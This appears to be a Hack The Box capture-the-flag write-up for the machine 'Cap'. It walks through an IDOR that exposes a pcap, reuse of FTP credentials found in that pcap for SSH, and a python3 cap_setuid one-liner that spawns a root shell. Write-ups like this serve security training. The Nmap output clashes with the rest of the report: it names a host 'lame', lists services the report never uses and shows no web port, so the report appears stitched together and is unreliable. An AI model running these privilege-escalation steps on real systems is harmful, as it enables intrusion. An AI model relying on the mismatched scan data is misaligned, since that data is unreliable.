![](attachments/Pasted%20image%2020251016211217.png)
#  Hack The Box: Cap (Retired Machine)

- [1. Executive Summary](#1-executive-summary)
- [2. Scanning & Enumeration](#2-scanning--enumeration)
	- [2.1 Port Scanning](#21-port-scanning)
		- [2.1.1 Output](#211-output)
	- [2.2 Web Enumeration](#22-web-enumeration)
		- [2.2.2 http://cap.htb/data/0](#222-httpcaphtbdata0)
		- [2.2.2 Output](#222-output)
	- [2.3 File Analysis](#23-file-analysis)
		- [2.3.1 Opening 0.pcap in Wireshark](#231-opening-0pcap-in-wireshark)
		- [2.3.2 Leaked FTP Credentials](#232-leaked-ftp-credentials)
	- [2.4 Capabilities Enumeration](#24-capabilities-enumeration)
		- [2.4.1 Find All Binaries With Capabilties](#241-find-all-binaries-with-capabilties)
		- [2.4.2 Output](#242-output)
- [3. Vulnerability Analysis](#3-vulnerability-analysis)
	- [3.1 Insecure Direct Object Reference (IDOR) on http://cap.htb/data/1](#31-insecure-direct-object-reference-idor-on-httpcaphtbdata1)
		- [3.1.1 Manipulate Identifier](#311-manipulate-identifier)
		- [3.1.2 Output](#312-output)
	- [3.2  CWE-309: Use of Password System for Primary Authentication](#32--cwe-309-use-of-password-system-for-primary-authentication)
		- [3.2.1 Use Same Credentials Found [2.3.2 Leaked FTP Credentials](#232-leaked-ftp-credentials)](#321-use-same-credentials-found-232-leaked-ftp-credentials232-leaked-ftp-credentials)
		- [3.2.1 Output](#321-output)
	- [3.3 Privilege Escalation Using Python](#33-privilege-escalation-using-python)
		- [3.3.1 Execute Command](#331-execute-command)
		- [3.3.2 Output](#332-output)


## 1. Executive Summary

This report outlines the penetration test conducted on the target host `cap.htb` under the HackTheBox environment. 

## 2. Scanning & Enumeration

### 2.1 Port Scanning

The following Nmap command was executed:

```bash
nmap -Pn -sC -sV -oN nmap/cap.nmap -vv cap.htb
```

#### 2.1.1 Output

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-16 15:07 UTC
Nmap scan report for 10.129.33.67
Host is up (0.086s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.48
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m36s, deviation: 2h49m46s, median: 33s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-10-16T11:08:51-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Nmap done: 1 IP address (1 host up) scanned in 61.22 seconds
```

### 2.2 Web Enumeration

#### 2.2.2 http://cap.htb/data/0

#### 2.2.2 Output

![](attachments/Pasted%20image%2020251016195239.png)

```bash
# Found Insecure Direct Object Reference (IDOR)  http://cap.htb/data/0 and able to download `0.pcap`
```

### 2.3 File Analysis

#### 2.3.1 Opening 0.pcap in Wireshark

```less
wireshark 0.pcap
```

#### 2.3.2 Leaked FTP Credentials

![](attachments/Pasted%20image%2020251016200041.png)

### 2.4 Capabilities Enumeration

#### 2.4.1 Find All Binaries With Capabilties

```bash
getcap -r / 2>/dev/null
```

#### 2.4.2 Output

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

## 3. Vulnerability Analysis

### 3.1 Insecure Direct Object Reference (IDOR) on http://cap.htb/data/1

> Insecure Direct Object Reference (IDOR) is a vulnerability that arises when attackers can access or modify objects by manipulating identifiers used in a web application's URLs or parameters. It occurs due to missing access control checks, which fail to verify whether a user should be allowed to access specific data.
> 
> Source: https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html

#### 3.1.1 Manipulate Identifier

```bash
http://cap.htb/data/0
http://cap.htb/data/1
http://cap.htb/data/2
http://cap.htb/data/3
http://cap.htb/data/4
```

#### 3.1.2 Output

Access to other user data is achieved by manipulating the identifier.

### 3.2  CWE-309: Use of Password System for Primary Authentication 

> The use of password systems as the primary means of authentication may be subject to several flaws or shortcomings, each reducing the effectiveness of the mechanism.
> 
> Source: https://cwe.mitre.org/data/definitions/309.html

#### 3.2.1 Use Same Credentials Found [2.3.2 Leaked FTP Credentials](#232-leaked-ftp-credentials) 

```bash
ssh -v [redacted]@cap.htb

Enter password: [redacted]
```

#### 3.2.1 Output

```bash
[redacted]@cap:~$ whoami
[redacted]
```

### 3.3 Privilege Escalation Using Python

> If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID
> 
> Source: https://gtfobins.github.io/gtfobins/python/#capabilities

#### 3.3.1 Execute Command

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

#### 3.3.2 Output

```bash
whoami
# root
```